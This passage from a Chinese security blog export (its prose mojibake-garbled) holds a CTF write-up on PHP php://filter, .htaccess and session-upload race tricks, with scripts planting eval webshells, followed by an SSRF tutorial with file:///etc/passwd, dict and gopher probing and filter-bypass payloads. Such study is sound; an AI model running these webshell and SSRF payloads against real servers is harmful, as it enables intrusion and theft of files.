<figure class="highlight"><table><tr><td class="code"><pre><span class="line">?content=php://filter/write=string.strip_tags/?&gt;AddType application/x-httpd-php .jpg%0aphp_value auto_append_file &#x27;php://filter/convert.ba\%0Ase64-decode/reso\%0Aurce=a.jpg&#x27;%0A%23/resource=.htaccess</span><br></pre></td></tr></table></figure>

<p>ä¼šå¾—åˆ°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">php_value auto_append_file <span class="string">&#x27;php://filter/convert.ba\</span></span><br><span class="line"><span class="string">se64-decode/reso\</span></span><br><span class="line"><span class="string">urce=a.jpg&#x27;</span></span><br><span class="line"><span class="comment">#/resource=.htaccess</span></span><br></pre></td></tr></table></figure>

<p>å‰ç½®çŸ¥è¯†çœ‹å¥½åï¼Œä¸‹é¢æ˜¯å®˜æ–¹çš„è§£æ³•äº†ã€‚</p>
<h3 id="äºŒæ¬¡ç¼–ç ç»•è¿‡"><a href="#äºŒæ¬¡ç¼–ç ç»•è¿‡" class="headerlink" title="äºŒæ¬¡ç¼–ç ç»•è¿‡"></a><strong>äºŒæ¬¡ç¼–ç ç»•è¿‡</strong></h3><p><code>file_put_contents</code>ä¸­å¯ä»¥è°ƒç”¨ä¼ªåè®®ï¼Œè€Œä¼ªåè®®å¤„ç†æ—¶ä¼šå¯¹è¿‡æ»¤å™¨urldecodeä¸€æ¬¡ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥åˆ©ç”¨äºŒæ¬¡ç¼–ç ç»•è¿‡çš„ï¼Œä¸è¿‡%25è¢«banäº†ï¼Œæµ‹è¯•%25è¢«banåå°±å¯ä»¥å†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å­—ç¬¦ï¼Œæ„é€ ä¸€äº›è¿‡æ»¤çš„å­—ç¬¦å°±å¯ä»¥åˆ©ç”¨æ­£å¸¸çš„å§¿åŠ¿ç»•è¿‡ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$char = <span class="string">&#x27;r&#x27;</span>; <span class="comment">#æ„é€ rçš„äºŒæ¬¡ç¼–ç  </span></span><br><span class="line"><span class="keyword">for</span> ($ascii1 = <span class="number">0</span>; $ascii1 &lt; <span class="number">256</span>; $ascii1++) &#123; </span><br><span class="line">    <span class="keyword">for</span> ($ascii2 = <span class="number">0</span>; $ascii2 &lt; <span class="number">256</span>; $ascii2++) &#123; </span><br><span class="line">        $aaa = <span class="string">&#x27;%&#x27;</span>.$ascii1.<span class="string">&#x27;%&#x27;</span>.$ascii2; </span><br><span class="line">        <span class="keyword">if</span>(urldecode(urldecode($aaa)) == $char)&#123; </span><br><span class="line">            <span class="keyword">echo</span> $char.<span class="string">&#x27;: &#x27;</span>.$aaa; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=Cyc1e.php </span><br><span class="line"><span class="comment">#Cyc1e.php </span></span><br><span class="line">&lt;?cuc rkvg();cuc://svygre/jevgr=fgevat.%72bg13|&lt;?php phpinfo();?&gt;|/erfbhepr=Plp1r.cuc </span><br></pre></td></tr></table></figure>

<h3 id="è¿‡æ»¤å™¨ç»•è¿‡"><a href="#è¿‡æ»¤å™¨ç»•è¿‡" class="headerlink" title="è¿‡æ»¤å™¨ç»•è¿‡"></a><strong>è¿‡æ»¤å™¨ç»•è¿‡</strong></h3><p>é¢˜ç›®ä¸­è¿‡æ»¤çš„è¿‡æ»¤å™¨æœ‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/iconv|UCS|UTF|rot|quoted|base64/ </span><br></pre></td></tr></table></figure>

<p>é¢„ç•™äº†zlibã€bzip2ã€stringç­‰è¿‡æ»¤å™¨ï¼Œ <code>php:filter</code> æ”¯æŒä½¿ç”¨å¤šä¸ªè¿‡æ»¤å™¨ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ <code>zlib</code> çš„ <code>zlib.deflate</code> å’Œ <code>zlib.inflate</code> æ¥åšï¼Œå‹ç¼©åå†è§£å‹åå†…å®¹è‚¯å®šä¸å˜ï¼Œå¯ä»¥åœ¨ä¸­é—´éå†ä¸€ä¸‹å‰©ä¸‹çš„å‡ ä¸ªè¿‡æ»¤å™¨ï¼Œçœ‹çœ‹ä¸­é—´æ“ä½œæ—¶å€™æ˜¯å¦ä¼šå½±å“åç»­inflateçš„å†…å®¹ï¼Œç®€å•éå†ä¸€ä¸‹å¯ä»¥å‘ç°ä¸­é—´æ’å…¥string.tolowerè½¬åä¼šæŠŠç©ºæ ¼å’Œexitå¤„ç†äº†å°±å¯ä»¥ç»•è¿‡exit</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e.php </span><br></pre></td></tr></table></figure>

<p>ä¼šç”Ÿæˆè¿™ä¸ª</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php@â€¦xit();php://fil|mr/zlib.lmfla|m|s|ring.|olowmr|zlib.infla|m|?&gt;&lt;?php</span><br><span class="line">eval($_GET[1]);?&gt;/vesouvce=Cyc1e.&lt;?p</span><br></pre></td></tr></table></figure>

<h3 id="çˆ†ç ´ä¸´æ—¶æ–‡ä»¶"><a href="#çˆ†ç ´ä¸´æ—¶æ–‡ä»¶" class="headerlink" title="çˆ†ç ´ä¸´æ—¶æ–‡ä»¶"></a><strong>çˆ†ç ´ä¸´æ—¶æ–‡ä»¶</strong></h3><p>ç¯å¢ƒç‰¹åœ°è®¾ç½®äº†php 7.0.33ç‰ˆæœ¬ï¼Œç”±äºfile_put_contentsä¹Ÿå¯ä»¥åˆ©ç”¨ä¼ªåè®®ï¼Œæ‰€ä»¥è€é—®é¢˜ï¼Œåˆ©ç”¨string.strip_tagsä¼šå‘ç”Ÿæ®µé”™è¯¯ï¼Œè¿™æ—¶å€™ä¸Šä¼ ä¸€ä¸ªshellä¼šä»¥ä¸´æ—¶æ–‡ä»¶çš„å½¢å¼ä¿å­˜åœ¨/tmpä¸­ï¼Œåˆ©ç”¨require_onceåŒ…å«getshellå³å¯ã€‚</p>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line">â€‹</span><br><span class="line">charset = string.digits + string.letters</span><br><span class="line">â€‹</span><br><span class="line">host = <span class="string">&quot;web_checkin2.wmctf.wetolink.com&quot;</span></span><br><span class="line">port = <span class="number">80</span></span><br><span class="line">base_url = <span class="string">&quot;http://%s:%d&quot;</span> % (host, port)</span><br><span class="line">â€‹</span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file_to_include</span>(<span class="params">url, file_content</span>):</span></span><br><span class="line"> Â   files = &#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;evil.jpg&#x27;</span>, file_content, <span class="string">&#x27;image/jpeg&#x27;</span>)&#125;</span><br><span class="line"> Â   <span class="keyword">try</span>:</span><br><span class="line"> Â  Â  Â   response = requests.post(url, files=files)</span><br><span class="line"> Â   <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"> Â  Â  Â   <span class="keyword">print</span> e</span><br><span class="line">â€‹</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_tmp_files</span>():</span></span><br><span class="line"> Â   file_content = <span class="string">&#x27;&lt;?php system(&quot;xxxxxxxx&quot;);?&gt;&#x27;</span></span><br><span class="line"> Â   phpinfo_url = <span class="string">&quot;%s/?content=php://filter/write=string.strip_tags/resource=Cyc1e.php&quot;</span> % (</span><br><span class="line"> Â  Â  Â   base_url)</span><br><span class="line"> Â   <span class="keyword">print</span> phpinfo_url</span><br><span class="line"> Â   length = <span class="number">6</span></span><br><span class="line"> Â   times = len(charset) ** (length / <span class="number">2</span>)</span><br><span class="line"> Â   <span class="keyword">for</span> i <span class="keyword">in</span> xrange(times):</span><br><span class="line"> Â  Â  Â   <span class="keyword">print</span> <span class="string">&quot;[+] %d / %d&quot;</span> % (i, times)</span><br><span class="line"> Â  Â  Â   upload_file_to_include(phpinfo_url, file_content)</span><br><span class="line">â€‹</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"> Â   generate_tmp_files()</span><br></pre></td></tr></table></figure>

<h2 id="Make-PHP-Great-Again"><a href="#Make-PHP-Great-Again" class="headerlink" title="Make PHP Great Again"></a><strong>Make PHP Great Again</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">require_once</span> $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå› ä¸º<code>flag.php</code>è¢«<code>require_once</code>åŒ…å«è¿‡ä¸€æ¬¡äº†ï¼Œæ‰€ä»¥ä¸‹é¢å¦‚æœç”¨ä¼ªåè®®å»è¯»çš„è¯ï¼Œæ˜¯è¯»å–ä¸åˆ°flag.phpçš„å†…å®¹çš„ã€‚ç¬¬ä¸€ä¸ªç‰ˆæœ¬å­˜åœ¨éé¢„æœŸï¼šsession.upload_progress</p>
<p>å…·ä½“å¯ä»¥å‚è€ƒï¼š<a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<p>è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/index.php?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;tgao.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<p>åŸç†å°±æ˜¯åˆ©ç”¨çš„æ˜¯æ¡ä»¶ç«äº‰ï¼Œä¸Šä¼ ä¸€ä¸ªè¶³å¤Ÿå¤§çš„æ–‡ä»¶å¢åŠ sessionæ–‡ä»¶çš„å­˜åœ¨æ—¶é—´ä½¿å¾—åŒ…å«æˆåŠŸã€‚</p>
<h2 id="Make-PHP-Great-Again2"><a href="#Make-PHP-Great-Again2" class="headerlink" title="Make PHP Great Again2"></a><strong>Make PHP Great Again2</strong></h2><p>PHPæœ€æ–°ç‰ˆ çš„å° Trickï¼Œ require_once åŒ…å«çš„è½¯é“¾æ¥å±‚æ•°è¾ƒå¤šäº‹ once çš„ hash åŒ¹é…ä¼šç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ã€‚</p>
<p>payload</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com/?file=php://filter/read=convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</span><br></pre></td></tr></table></figure>

<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h1><h2 id="Happy-birthday"><a href="#Happy-birthday" class="headerlink" title="Happy_birthday!"></a><strong>Happy_birthday!</strong></h2><p>æ‰“å¼€é¢˜ç›®çœ‹åˆ°æ–‡ä»¶åâ€daolnwod.zipâ€ï¼Œçœ‹åˆ°æ–‡ä»¶ç»“å°¾çš„4B 50ä¸éš¾æƒ³åˆ°å°†æ–‡ä»¶reverseåå°±èƒ½å¾—åˆ°å‹ç¼©åŒ…å’Œflag </p>
<p>è„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;daolnwod.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">f = f[::<span class="number">-1</span>]</span><br><span class="line">f2 = open(<span class="string">&#x27;flag.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(f)</span><br></pre></td></tr></table></figure>

<p>è§£å‹å³å¯å¾—åˆ°flagã€‚</p>
]]></content>
      <categories>
        <category>CTFæ¯”èµ›</category>
      </categories>
  </entry>
  <entry>
    <title>SSRFæ¼æ´å­¦ä¹ </title>
    <url>/2020/07/14/SSRF%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h1><p>æ€»ç»“çš„ä¸æ˜¯å¾ˆå…¨ï¼Œä»¥åæ…¢æ…¢æ›´ã€‚</p>
<h1 id="ssrfæ˜¯ä»€ä¹ˆ"><a href="#ssrfæ˜¯ä»€ä¹ˆ" class="headerlink" title="ssrfæ˜¯ä»€ä¹ˆ"></a><strong>ssrfæ˜¯ä»€ä¹ˆ</strong></h1><p><strong>SSRF(Server-Side Request Forgery:æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ )</strong></p>
<p>å…¶å½¢æˆçš„åŸå› å¤§éƒ½æ˜¯ç”±äºæœåŠ¡ç«¯<strong>æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½</strong>ï¼Œä½†åˆæ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšä¸¥æ ¼è¿‡æ»¤ä¸é™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„åœ°å€æ¥è®©åç«¯æœåŠ¡å™¨å¯¹å…¶å‘èµ·è¯·æ±‚ï¼Œå¹¶è¿”å›å¯¹è¯¥ç›®æ ‡åœ°å€è¯·æ±‚çš„æ•°æ®ã€‚</p>
<p>æ¯”å¦‚æœ‰ä¸ªURLæ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.kawhi.xyz/a.jpg</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªURLåŸæœ¬æ˜¯æœåŠ¡ç«¯å‘èµ·è¯·æ±‚è·å–é“¾æ¥åœ°å€çš„å›¾ç‰‡æ•°æ®ã€‚</p>
<p>ä½†æ˜¯å¦‚æœå­˜åœ¨SSRFæ¼æ´çš„è¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨ä¸€äº›åè®®æ¥è¯»å–å’Œæ‰§è¡Œç›¸å…³å‘½ä»¤ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://127.0.0.1:22</span><br><span class="line">http://www.xxx.com/image.php?image=file:///etc/passwd</span><br><span class="line">http://www.xxx.com/image.php?image=dict://127.0.0.1:22/</span><br><span class="line">http://www.xxx.com/image.php?image=gopher://127.0.0.1:2233/_test</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œå¦‚ä½•åˆ¤æ–­æ˜¯å¦å­˜åœ¨SSRFæ¼æ´å‘¢ï¼Ÿ</p>
<p>é€šå¸¸æ¥è¯´ä¼šå‡ºç°SSRFçš„åœ°æ–¹æ¯”å¦‚ä¸Šé¢è¯´çš„URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://www.xxx.com/image.php?image=http://www.kawhi.xyz/a.jpg</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰å°±æ˜¯å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://title.xxx.com/title?title=http://title.xxx.com/fhaljs</span><br></pre></td></tr></table></figure>

<p>ä»¥åŠé€šè¿‡URLåˆ†äº«ï¼Œè½¬ç æœåŠ¡ï¼Œåœ¨çº¿ç¿»è¯‘ï¼Œæœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ç­‰ç­‰ä¸€äº›åœ°æ–¹ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸€äº›urlä¸­çš„å…³é”®å­—æ¥è¯†åˆ«ï¼Œæ¯”å¦‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€<span class="number">3</span>gã€displayã€sourceURlã€imageURLã€domain...</span><br></pre></td></tr></table></figure>

<h1 id="ssrfå°è¯•éªŒ"><a href="#ssrfå°è¯•éªŒ" class="headerlink" title="ssrfå°è¯•éªŒ"></a>ssrfå°è¯•éªŒ</h1><p>é¦–å…ˆè¦çŸ¥é“å¯èƒ½å‡ºç°SSRFçš„å‡½æ•°æœ‰ï¼š<code>file_get_contents()</code>ã€<code>curl()</code>ã€<code>fsocksopen()</code>ã€<code>fopen()</code>ç­‰ï¼Œè¿™é‡Œç”¨<code>curl()</code>æ¥ä¸¾ä¾‹å­ã€‚</p>
<p>å­˜åœ¨SSRFæ¼æ´çš„ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">  <span class="comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„curlèµ„æº</span></span><br><span class="line">  $ch = curl_init();</span><br><span class="line">  <span class="comment">//è®¾ç½®URLå’Œç›¸åº”çš„é€‰é¡¹</span></span><br><span class="line">  curl_setopt($ch,CURLOPT_URL,$url);</span><br><span class="line">  curl_setopt($ch,CURLOPT_HEADER,<span class="literal">false</span>);</span><br><span class="line">  <span class="comment">//æŠ“å–URLå¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨</span></span><br><span class="line">  curl_exec($ch);</span><br><span class="line">  <span class="comment">//å…³é—­curlèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº</span></span><br><span class="line">  curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>httpåè®®</li>
</ul>
<p>æ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=http://127.0.0.1:1314</span><br></pre></td></tr></table></figure>

<ul>
<li>é€šè¿‡fileåè®®è¯»å–æ–‡ä»¶</li>
</ul>
<p>åœ¨æœ‰å›æ˜¾çš„æƒ…å†µä¸‹ï¼Œåˆ©ç”¨ file åè®®å¯ä»¥è¯»å–ä»»æ„å†…å®¹</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="comment">#win</span></span><br><span class="line">http://127.0.0.1/ssrf.php?url=file:///C:/WINDOWS/win.ini</span><br><span class="line"><span class="comment">#liunx</span></span><br><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=file:///etc/passwd</span><br></pre></td></tr></table></figure>

<ul>
<li>dictåè®®</li>
</ul>
<p>æ³„éœ²å®‰è£…è½¯ä»¶ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹ç«¯å£ï¼Œæ“ä½œå†…ç½‘redisæœåŠ¡ç­‰</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=dict://127.0.0.1:6379/info</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹redisçš„ç›¸å…³é…ç½®ã€‚</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=dict://127.0.0.1:22/info</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹sshçš„bannerä¿¡æ¯</p>
<ul>
<li>gopheråè®®</li>
</ul>
<p>gopheræ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼šå¯ä»¥å…ˆæˆªè·getè¯·æ±‚åŒ…å’Œpostè¯·æ±‚åŒ…ï¼Œå†æ„é€ æˆç¬¦åˆgopheråè®®çš„è¯·æ±‚ï¼Œgopheråè®®æ˜¯ssrfåˆ©ç”¨ä¸­ä¸€ä¸ªæœ€å¼ºå¤§çš„åè®®(ä¿—ç§°ä¸‡èƒ½åè®®)ï¼Œå¯ç”¨äºåå¼¹shellã€‚</p>
<p>è¿™é‡Œä½¿ç”¨çš„æ˜¯é˜¿é‡Œäº‘æœåŠ¡å™¨ï¼Œå…ˆå¼€å¯ä¸€ä¸ªç›‘å¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@iZ2ze3hhi0u5dwj1frqvh7Z:~<span class="comment"># nc -lvvp 8102</span></span><br><span class="line">listening on [any] <span class="number">8102</span> ...</span><br></pre></td></tr></table></figure>

<p>ç„¶åè®¿é—®</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://39.xxx.xxx.xxx:5212/ssrf.php?url=gopher://127.0.0.1:8102/_test</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">root@iZ2ze3hhi0u5dwj1frqvh7Z:~<span class="comment"># nc -lvvp 8102</span></span><br><span class="line">listening on [any] <span class="number">8102</span> ...</span><br><span class="line">connect to [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="keyword">from</span> localhost [<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>] <span class="number">52450</span></span><br><span class="line">test</span><br></pre></td></tr></table></figure>

<h1 id="ssrfæ€ä¹ˆç»•"><a href="#ssrfæ€ä¹ˆç»•" class="headerlink" title="ssrfæ€ä¹ˆç»•"></a><strong>ssrfæ€ä¹ˆç»•</strong></h1><p>è¿™é‡Œæ€»ç»“äº†ä¸€äº›æ¯”è¾ƒå¸¸ç”¨çš„ç»•è¿‡æ–¹æ³•ã€‚</p>
<ul>
<li>dataä¼ªåè®®ç»•è¿‡</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Â <span class="meta">&lt;?php</span> Â  Â </span><br><span class="line">Â highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/php|file|\/\/|sftp|ldap|gopher|http|https/is&#x27;</span>, $_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">     <span class="keyword">die</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">$a = file_get_contents($_GET[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line"><span class="keyword">eval</span>($a); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data:text/plain;base64,cGhwaW5mbygpOw==</span><br></pre></td></tr></table></figure>

<ul>
<li>IPé™åˆ¶ç»•è¿‡</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">115.239</span><span class="number">.210</span><span class="number">.26</span>  &gt;&gt;&gt;  <span class="number">16373751032</span></span><br><span class="line">é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ<span class="number">16</span>è¿›åˆ¶ï¼Œç»“æœï¼š<span class="number">73</span> ef d2 <span class="number">1</span>a</span><br><span class="line">ç„¶åæŠŠ <span class="number">73</span>efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆ<span class="number">8</span>è¿›åˆ¶</span><br><span class="line">è®°å¾—è®¿é—®çš„æ—¶å€™åŠ <span class="number">0</span>è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶(å¯ä»¥æ˜¯ä¸€ä¸ª<span class="number">0</span>ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>  &gt;&gt;&gt;  http://<span class="number">2130706433</span>/</span><br></pre></td></tr></table></figure>

<ul>
<li>è§£æurlçš„ç»•è¿‡</li>
</ul>
<p>å½“åç«¯ç¨‹åºé€šè¿‡ä¸æ­£ç¡®çš„æ­£åˆ™è¡¨è¾¾å¼ï¼ˆæ¯”å¦‚å°†httpä¹‹ååˆ°comä¸ºæ­¢çš„å­—ç¬¦å†…å®¹ï¼Œä¹Ÿå°±æ˜¯<code>www.baidu.com</code>ï¼Œè®¤ä¸ºæ˜¯è®¿é—®è¯·æ±‚çš„hoståœ°å€æ—¶ï¼‰å¯¹ä¸Šè¿°URLçš„å†…å®¹è¿›è¡Œè§£æçš„æ—¶å€™ï¼Œå¾ˆæœ‰å¯èƒ½ä¼šè®¤ä¸ºè®¿é—®URLçš„hostä¸º<code>www.baidu.com</code>ï¼Œè€Œå®é™…ä¸Šè¿™ä¸ªURLæ‰€è¯·æ±‚çš„å†…å®¹éƒ½æ˜¯127.0.0.1ä¸Šçš„å†…å®¹ã€‚</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://www.baidu.com@<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br><span class="line"><span class="comment">#ç›¸å½“äº</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯åœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ï¼Œä¾‹å¦‚ï¼š <code>http://www.aaa.com@www.bbb.com@www.ccc.com</code>ï¼Œåœ¨PHPçš„parse_urlä¸­ä¼šè¯†åˆ«<code>www.ccc.com</code>ï¼Œè€Œlibcurlåˆ™è¯†åˆ«ä¸º<code>www.bbb.com</code>ã€‚</p>
<ul>
<li>å®šåˆ¶DNSæœåŠ¡</li>
</ul>
